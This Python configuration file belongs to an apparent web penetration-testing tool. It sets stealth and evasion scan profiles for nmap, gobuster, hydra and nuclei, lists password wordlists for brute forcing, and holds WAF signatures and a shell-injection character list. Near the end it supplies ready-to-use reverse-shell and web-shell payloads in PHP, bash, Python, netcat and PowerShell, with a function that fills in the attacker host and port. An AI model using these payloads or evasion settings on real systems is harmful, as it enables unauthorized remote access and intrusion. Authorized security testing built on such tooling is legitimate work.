import os

# Gost,stealth,normal,aggressive properties for each tool based on traffic they create
STEALTH_PROFILES = {
    "ghost": {
        "nmap_timing": "T1",
        "nmap_extra": "--scan-delay 5s --max-retries 1",
        "gobuster_threads": 5,
        "gobuster_delay": "500ms",
        "hydra_tasks": 4,
        "hydra_wait": 5,
        # Real-world-tool tuning (httpx / nuclei / whatweb) -- kept slow and quiet
        "httpx_threads": 5,
        "httpx_rate_limit": 10,
        "nuclei_concurrency": 5,
        "nuclei_rate_limit": 10,
        "whatweb_aggression": 1,     # 1 = stealthy (single, passive request)
        "description": "Maximum evasion. Slow but quiet. Mimics human browsing."
    },
    "stealth": {
        "nmap_timing": "T2",
        "nmap_extra": "--scan-delay 2s --max-retries 2",
        "gobuster_threads": 10,
        "gobuster_delay": "200ms",
        "hydra_tasks": 8,
        "hydra_wait": 3,
        "httpx_threads": 10,
        "httpx_rate_limit": 50,
        "nuclei_concurrency": 10,
        "nuclei_rate_limit": 50,
        "whatweb_aggression": 1,
        "description": "Balanced evasion. Suitable for most engagements."
    },
    "normal": {
        "nmap_timing": "T3",
        "nmap_extra": "",
        "gobuster_threads": 20,
        "gobuster_delay": "0ms",
        "hydra_tasks": 16,
        "hydra_wait": 0,
        "httpx_threads": 25,
        "httpx_rate_limit": 150,
        "nuclei_concurrency": 25,
        "nuclei_rate_limit": 150,
        "whatweb_aggression": 3,     # 3 = aggressive (follows leads, more requests)
        "description": "Default nmap timing. No evasion. Reasonable speed."
    },
    "aggressive": {
        "nmap_timing": "T4",
        "nmap_extra": "",
        "gobuster_threads": 50,
        "gobuster_delay": "0ms",
        "hydra_tasks": 32,
        "hydra_wait": 0,
        "httpx_threads": 50,
        "httpx_rate_limit": 500,
        "nuclei_concurrency": 50,
        "nuclei_rate_limit": 500,
        "whatweb_aggression": 3,
        "description": "Fast and loud. Use only in isolated lab environments."
    }
}

# default profile is always stealth
DEFAULT_STEALTH_PROFILE = "stealth"

# tool binaries
TOOL_BINARIES = {
    "nmap":      "nmap",
    "gobuster":  "gobuster",
    "hydra":     "hydra",
    "grep":      "grep",
    "curl":      "curl",
    "nc":        "nc",
    "whatweb":   "whatweb",   # deep tech fingerprinting
    "httpx":     "httpx",     # ProjectDiscovery fast HTTP prober (see HTTPX_ALT_BINARY)
    "wafw00f":   "wafw00f",   # WAF fingerprinting
    "nuclei":    "nuclei",    # template-based vuln / exposure / tech detection
    "sslscan":   "sslscan",   # TLS / cipher assessment
}

# ProjectDiscovery httpx clashes on the name "httpx" with the Python HTTP client
# (pip package "httpx"). Distros such as Kali ship the scanner as "httpx-toolkit"
# to avoid the collision. recon.py prefers this binary and verifies identity
# before trusting whichever "httpx" is on PATH.
HTTPX_ALT_BINARY = "httpx-toolkit"

# Tools that are mandatory vs optional (optional ones degrade gracefully)
MANDATORY_TOOLS = ["nmap", "gobuster", "hydra", "grep", "curl"]
OPTIONAL_TOOLS  = ["whatweb", "httpx", "wafw00f", "nuclei", "sslscan", "nc"]

# Recon depth profiles -- control how much active scanning the recon phase does.
# Independent of the stealth profile (which controls speed/noise per request).
#   light    : fast triage -- probing + tech fingerprint + WAF, nuclei tech only
#   standard : + exposures / misconfig / default-logins, http NSE scripts, TLS
#   deep     : + CVE templates and nmap `vuln` NSE (loud, authorized engagements)
RECON_DEPTH_PROFILES = {
    "light": {
        "nuclei_tags":     ["tech"],
        "nuclei_severity": "",                       # no severity filter for tech
        "nmap_scripts":    ["http-title", "http-headers"],
        "run_vuln_nse":    False,
        "run_tls":         False,
        "run_nuclei":      True,
        "description":     "Fast triage: probe + fingerprint + WAF + nuclei tech.",
    },
    "standard": {
        "nuclei_tags":     ["tech", "exposure", "misconfiguration", "default-login"],
        "nuclei_severity": "low,medium,high,critical",
        "nmap_scripts":    ["http-enum", "http-title", "http-headers", "http-methods"],
        "run_vuln_nse":    False,
        "run_tls":         True,
        "run_nuclei":      True,
        "description":     "Balanced: adds exposures, misconfig, default-logins, TLS.",
    },
    "deep": {
        "nuclei_tags":     ["tech", "exposure", "misconfiguration", "default-login", "cve"],
        "nuclei_severity": "medium,high,critical",
        "nmap_scripts":    ["http-enum", "http-title", "http-headers", "http-methods", "vuln"],
        "run_vuln_nse":    True,
        "run_tls":         True,
        "run_nuclei":      True,
        "description":     "Thorough: adds CVE templates and nmap vuln NSE. Loud.",
    },
}
DEFAULT_RECON_DEPTH = "standard"

# wordlists paths
WORDLIST_DIRS = [
    "/usr/share/wordlists",
    "/usr/share/seclists",
    "/opt/SecLists",
    os.path.expanduser("~/wordlists"),
]

# Wordlists full path
WORDLISTS = {
    "dirs_small": [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
    ],
    "dirs_medium": [
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    ],
    "dirs_large": [
        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt",
    ],
    "subdomains": [
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "/usr/share/wordlists/dirb/others/names.txt",
    ],
    "vhosts": [
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
    ],
    "usernames": [
        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
        "/usr/share/wordlists/brutespray/rlogin/user",
    ],
    "passwords_small": [
        "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
    ],
    "passwords_medium": [
        "/usr/share/wordlists/brutespray/rlogin/password",
    ],
    "passwords_large": [
        "/usr/share/wordlists/rockyou.txt",
    ],
}

def resolve_wordlist(key: str) -> str | None:
    # Return the first existing wordlist path for the given key.
    # Returns None if no wordlist is found on disk.
    candidates = WORDLISTS.get(key, [])
    for path in candidates:
        if os.path.isfile(path):
            return path
    return None

# Ports considered web-facing (HTTP variants)
HTTP_PORTS  = [80, 8080, 8000, 8888, 8008]
# Ports considered web (HTTPS variants)
HTTPS_PORTS = [443, 8443, 9443]
# All ports combined
ALL_WEB_PORTS = HTTP_PORTS + HTTPS_PORTS

# Nmap port scan scope options
PORT_PROFILES = {
    "web_only":  "-p 80,443,8080,8443,8000,8888",
    "common":    "--top-ports 1000",
    "full":      "-p-",
}
# Default profile
DEFAULT_PORT_PROFILE = "web_only"

# Signatures used to fingerprint WAFs from HTTP response headers/body
WAF_SIGNATURES = {
    "Cloudflare":       ["cf-ray", "cloudflare", "__cfduid"],
    "ModSecurity":      ["mod_security", "modsecurity", "NOYB"],
    "Akamai":           ["akamai", "ak-bmsc", "bm_sz"],
    "AWS WAF":          ["awswaf", "x-amzn-requestid"],
    "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo"],
    "F5 BIG-IP ASM":    ["ts=", "f5-trafficshield", "bigip"],
    "Sucuri":           ["x-sucuri-id", "sucuri"],
    "Barracuda":        ["barra_counter_session", "barracuda"],
    "Fortinet":         ["cookiesession1=", "fortigate"],
}

# HTTP response codes that commonly indicate WAF blocking
WAF_BLOCK_CODES = [403, 406, 429, 501, 999]

# Templates for reverse/bind shells in multiple languages
ATTACKER_DEFAULT_PORT = 4444

SHELL_TEMPLATES = {
    "php_exec": (
        "<?php if(isset($_REQUEST['cmd'])){{ "
        "echo '<pre>'; $out=shell_exec($_REQUEST['cmd']); "
        "echo htmlspecialchars($out); echo '</pre>'; }} ?>"
    ),
    "php_reverse": (
        "<?php\n"
        "$ip='{LHOST}'; $port={LPORT};\n"
        "$sock=fsockopen($ip,$port);\n"
        "$proc=proc_open('/bin/sh -i',array(0=>$sock,1=>$sock,2=>$sock),$pipes);\n"
        "?>"
    ),
    "bash_reverse": (
        "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
    ),
    "python_reverse": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "nc_reverse": (
        "nc -e /bin/bash {LHOST} {LPORT}"
    ),
    "nc_mkfifo": (
        "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f"
    ),
    "powershell_reverse": (
        "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String);"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};"
        "$client.Close()"
    ),
}

def build_shell(shell_type: str, lhost: str, lport: int) -> str | None:
    # Render a shell template with attacker LHOST and LPORT substituted.
    # Returns None if shell_type is not found.
    template = SHELL_TEMPLATES.get(shell_type)
    if not template:
        return None
    return template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))

# Reporting formats
REPORT_FORMATS = ["json", "html", "markdown", "csv"]
# Formats produced when the user asks for "all"
REPORT_ALL_FORMATS = ["json", "html", "markdown", "csv"]
# Default reporting format
DEFAULT_REPORT_FORMAT = "json"

# Output directory base — sessions go in subdirs named by timestamp + target
OUTPUT_BASE_DIR = os.path.join(os.path.expanduser("~"), "web_csan_output")

# Used by recon and WAF detection modules (curl / requests)
DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
}

REQUEST_TIMEOUT = 10  # seconds

# Regex patterns used by validator.py
import re

VALID_IP_REGEX = re.compile(
    r"^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$"
)
VALID_DOMAIN_REGEX = re.compile(
    r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"
)
VALID_URL_REGEX = re.compile(
    r"^https?://[^\s/$.?#].[^\s]*$"
)
VALID_PORT_RANGE = (1, 65535)

# Characters that signal shell injection attempts in user input
SHELL_INJECTION_CHARS = [";", "&&", "||", "|", "`", "$(",  "$(", ">", "<", "\n", "\r"]
